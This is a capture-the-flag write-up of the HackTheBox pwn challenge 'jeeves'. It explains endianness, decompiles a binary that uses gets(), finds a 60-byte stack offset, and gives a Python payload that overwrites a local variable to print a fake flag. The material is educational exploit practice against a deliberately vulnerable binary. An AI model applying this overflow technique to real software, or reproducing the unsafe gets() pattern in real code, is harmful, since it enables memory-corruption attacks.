---
title: jeeves
description: Writeup for the easy pwn challenge - jeeves
created: 2025-06-14
tags: hackthebox, pwn, ctf, practice
---

## Challenge Info

**jeeves** is an easy pwn challenge on HackTheBox, created by **MinatoTW** and released on October 29, 2019.

Since this is my first pwn challenge writeup, I’ll be a bit more verbose.

jeeves is a very straightforward challenge. After decompiling the `main` function, it becomes immediately clear that the attacker needs to provide the correct input to trigger the flag and retrieve it.

## recon

After decompressing the downloaded archive, we obtained a single file named `jeeves`. Let's determine the file type:

```console
$ file jeeves
jeeves: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=18c31354ce48c8d63267a9a807f1799988af27bf, for GNU/Linux 3.2.0, not stripped
```

Let's break down this output. First, we're told that this is an ELF 64-bit LSB PIE executable. The [Executable and Linkable Format (ELF)](https://en.wikipedia.org/wiki/Executable_and_Linkable_Format) is a common file format for executable files on Linux. "LSB" stands for "Least Significant Byte," indicating that the file is in little-endian format. Here's [an excellent explanation](https://betterexplained.com/articles/understanding-big-and-little-endian-byte-order/) of the difference between little-endian and big-endian. In simple terms:

Data can be interpreted in different ways. For instance, let's say we want to write and read the following decimal number: 305419896, which is represented in hexadecimal as 0x12345678.

If the machine is little-endian (little end first), it writes and reads data starting from the least significant byte. This means that the bytes are stored in memory from right to left, with the least significant byte at the lowest memory address.

<style>
    .ascii-art {
        font-family: monospace;
        white-space: pre;
    }
</style>
<pre class="ascii-art">


            0x123456 78
                      ^
                     Least significant byte

      +-----------------+--------------+
      |     Address     |     Data     |
      +-----------------+--------------+
      |     0x1000      |     0x78     |
      +-----------------+--------------+
      |     0x1001      |     0x56     |
      +-----------------+--------------+
      |     0x1002      |     0x34     |
      +-----------------+--------------+
      |     0x1003      |     0x12     |
      +-----------------+--------------+

</pre>

When the data is read back, the machine reassembles it in the same manner: from right to left. The bytes are read starting from the lowest memory address and reconstructed in order, with the least significant byte first.

This will be important later, but first, let's start reading some code!

## decompiling with ghidra

We'll be using Ghidra as our decompiler. We'll import the ELF binary into Ghidra and clean up the decompiled code:

```c
undefined8 main(void)

{
  char overflow_me [44];
  int flag_handle;
  char *flag_ptr;
  int key;

  key = L'\xdeadc0d3';
  printf("Hello, good sir!\nMay I have your name? ");
  gets(overflow_me);
  printf("Hello %s, hope you have a good day!\n",overflow_me);
  if (key == 0x1337bab3) {
    flag_ptr = (char *)malloc(256);
    flag_handle = open("flag.txt",0);
    read(flag_handle,flag_ptr,0x100);
    printf("Pleased to make your acquaintance. Here\'s a small gift: %s\n",flag_ptr);
    close(flag_handle);
  }
  return 0;
}
```

The program begins by prompting us for our name. It then checks whether the `key` variable equals `0x1337bab3`. If the `key` matches, `flag.txt` is opened, read, and displayed to the user. A discerning code reviewer might observe that the `key` variable is essentially dead code, as it cannot be modified by the user through normal means. Additionally, a careful reviewer would immediately notice the use of the [gets](https://man7.org/linux/man-pages/man3/gets.3.html) API. [The `gets` function is extremely dangerous](https://stackoverflow.com/questions/1694036/why-is-the-gets-function-so-dangerous-that-it-should-not-be-used) and should be avoided.

Lastly, I won't cover what a buffer overflow is, as there are already many detailed explanations available that are far [better](http://phrack.org/issues/49/14.html).

## finding the offset

To begin, we'll determine the offset from `overflow_me` to `key`. There are several ways to accomplish this, so I'll demonstrate a couple of methods.

First, Ghidra is particularly useful for identifying the position of local variables on the stack. Let's start by examining the disassembly of the `main` function:

<pre class="ascii-art">


    **************************************************************
    *                          FUNCTION                          *
    **************************************************************
    undefined8 __stdcall main(void)
    undefined8        RAX:8          <RETURN>
    undefined4        Stack[-0xc]:4  key                                     XREF[2]:     001011f5(W), 
                                                                                          00101236(R)  
    undefined8        Stack[-0x18]:8 flag_ptr                                XREF[3]:     00101249(W), 
                                                                                          00101266(R), 
                                                                                          00101281(R)  
    undefined4        Stack[-0x1c]:4 flag_handle                             XREF[3]:     00101263(W), 
                                                                                          0010126a(R), 
                                                                                          00101299(R)  
    undefined1[44]    Stack[-0x48]   overflow_me                             XREF[2]:     0010120d(*), 
                                                                                          0010121e(*)  
        main                                                                 XREF[4]:     Entry Point(*), 
                                                                                          _start:00101121(*), 001020c8, 
                                                                                          00102170(*)  


</pre>

The disassembly reveals that the `overflow_me` variable is located 0x48 bytes up the stack, while the `key` variable is only 0xc bytes up the stack.

<pre class="ascii-art">


0x1000   +-----------------------+ < rsp
         |                       |
         +-----------------------+
         |     overflow_me       | < -0x48
         +-----------------------+
         |                       |
         |                       |
         |                       |
         +-----------------------+
         |        key            | < -0xc
         +-----------------------+ < rbp
         |                       |
         |                       |
         |                       |
         |                       |
         |                       |
         |                       |
         |                       |
         |                       |
0xffff   +-----------------------+ 


</pre>

Using the power of basic arithmetic:

`0x48 - 0xc = 0x3c or 60`

Another approach to determine this is by using "efficient brute force." We can dump the disassembly with GDB:

```bash
$ gdb -q ./jeeves
gef➤ disas main
...<snip>...
   0x00005555555551f5 <+12>:    mov    DWORD PTR [rbp-0x4],0xdeadc0d3
   0x00005555555551fc <+19>:    lea    rdi,[rip+0xe05]        # 0x555555556008
...<snip>...
   0x0000555555555214 <+43>:    mov    eax,0x0
   0x0000555555555219 <+48>:    call   0x5555555550d0 <gets@plt>
   0x000055555555521e <+53>:    lea    rax,[rbp-0x40]
...<snip>...
   0x0000555555555231 <+72>:    call   0x5555555550a0 <printf@plt>
   0x0000555555555236 <+77>:    cmp    DWORD PTR [rbp-0x4],0x1337bab3
   0x000055555555523d <+84>:    jne    0x5555555552a8 <main+191>
   0x000055555555523f <+86>:    mov    edi,0x100
   0x0000555555555244 <+91>:    call   0x5555555550e0 <malloc@plt>
...<snip>...

```

From the disassembly, we can observe where `0xdeadc0d3` is loaded (at 0x00005555555551f5), where the `gets` call occurs (at 0x0000555555555219), and where `key` is compared to `0x1337bab3` (at 0x0000555555555236). First, let's set a breakpoint at 0x0000555555555236. If you don't have the [GDB-gef](https://github.com/hugsy/gef) plugin, you can use an online tool like [Wiremask](https://wiremask.eu/tools/buffer-overflow-pattern-generator/) to generate the input.

```bash
gef➤ b *0x0000555555555236
gef➤  pattern create 100
[+] Generating a pattern of 100 bytes (n=8)
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa
[+] Saved as '$_gef2'
gef➤ r
...<hit-breakpoint>
gef➤  pattern offset $rbp-0x4
[+] Searching for '6161616169616161'/'6161616961616161' with period=8
[+] Found at offset 60 (little-endian search) likely
gef➤
```

Again, we see that the offset is 60 bytes.

## exploiting the buffer overflow

Lastly, we need to exploit the buffer overflow to obtain the flag. To achieve this, we'll overwrite `rbp-0x4` with `0x1337bab3`. Let's proceed with that:

```bash
$ python3 -c 'import sys;sys.stdout.buffer.write(b"A" * 60 + b"\x13\x37\xba\xb3")' > payload
$ cat payload | ./jeeves
Hello, good sir!
May I have your name? Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA7, hope you have a good day!
```

That's odd—why didn't it work? Let's debug the issue.

We'll follow the same process as before and set a breakpoint at the `cmp` instruction in GDB:

```bash
gef➤  b *0x0000555555555236
gef➤  r < payload
gef➤  x/xw $rbp-0x4
0x7fffffffdc6c: 0xb3ba3713
```

What the heck! Why does our input look like that? Remember from [Recon](#recon) when we discussed little-endian formatting?

When the machine reads in the payload, it assumes we are aware of its endianness. The machine processes the data as if it is in the correct format. Therefore, the first byte of the payload is treated as the least significant byte and is placed at the lowest memory address:

<pre class="ascii-art">


      +--------------------------+--------------+
      |     Address              |     Data     |
      +--------------------------+--------------+
      |     0x7fffffffdc6c       |     0x13     |
      +--------------------------+--------------+
      |     0x7fffffffdc6d       |     0x37     |
      +--------------------------+--------------+
      |     0x7fffffffdc6e       |     0xba     |
      +--------------------------+--------------+
      |     0x7fffffffdc6f       |     0xb3     |
      +--------------------------+--------------+


</pre>

When the machine reads this data back, it reassembles it from right to left, starting with the lowest memory address. This results in the payload `0xb3ba3713`.

To compensate for this, we need to align with how the computer reads bytes. Typically, this means reversing the order of your payload:

```bash
$ python3 -c 'import sys;sys.stdout.buffer.write(b"A" * 60 + b"\xb3\xba\x37\x13")' > payload
$ cat payload | ./jeeves
Hello, good sir!
May I have your name? Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA7, hope you have a good day!
Pleased to make your acquaintance. Here's a small gift: flag{fake_flag}
```

## references

- https://en.wikipedia.org/wiki/Executable_and_Linkable_Format
- https://betterexplained.com/articles/understanding-big-and-little-endian-byte-order/
- https://man7.org/linux/man-pages/man3/gets.3.html
- https://stackoverflow.com/questions/1694036/why-is-the-gets-function-so-dangerous-that-it-should-not-be-used
- http://phrack.org/issues/49/14.html
- https://github.com/hugsy/gef
- https://wiremask.eu/tools/buffer-overflow-pattern-generator/
